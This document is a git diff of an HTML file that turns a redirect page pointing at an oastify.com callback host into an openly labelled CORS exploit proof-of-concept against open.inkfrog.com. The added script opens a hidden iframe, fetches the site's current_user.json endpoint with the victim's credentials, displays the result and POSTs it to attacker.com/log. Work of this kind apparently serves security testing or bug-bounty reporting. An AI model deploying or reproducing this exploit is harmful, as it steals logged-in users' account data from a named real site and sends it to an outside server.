@@ -1,16 +1,41 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting...</title>
-    <script type="text/javascript">
-        window.onload = function() {
-            window.location.href = "http://fj23iar8tlfhj8qr940x89i31u7lvej3.oastify.com";
-        }
-    </script>
+  <title>CORS Referer Exploit - open.inkfrog.com</title>
 </head>
 <body>
-    <p>If you are not redirected automatically, follow this <a href="http://fj23iar8tlfhj8qr940x89i31u7lvej3.oastify.com">link</a>.</p>
+  <h2>🔓 Exfiltrating current_user.json from open.inkfrog.com</h2>
+  <pre id="output">Loading...</pre>
+
+  <script>
+    // Force the browser to send the correct Referer
+    const iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    iframe.src = "https://builder.asd.com"; // page must exist or redirect
+
+    document.body.appendChild(iframe);
+
+    setTimeout(() => {
+      fetch("https://open.inkfrog.com/api/current_user.json", {
+        credentials: "include"
+      })
+      .then(res => {
+        if (!res.ok) throw new Error("Fetch failed: " + res.status);
+        return res.text();
+      })
+      .then(data => {
+        document.getElementById("output").textContent = data;
+
+        // Optional: Exfil to attacker server
+        fetch("https://attacker.com/log", {
+          method: "POST",
+          body: data
+        });
+      })
+      .catch(err => {
+        document.getElementById("output").textContent = "Error: " + err;
+      });
+    }, 1500); // Delay to allow Referer to register
+  </script>
 </body>
 </html>
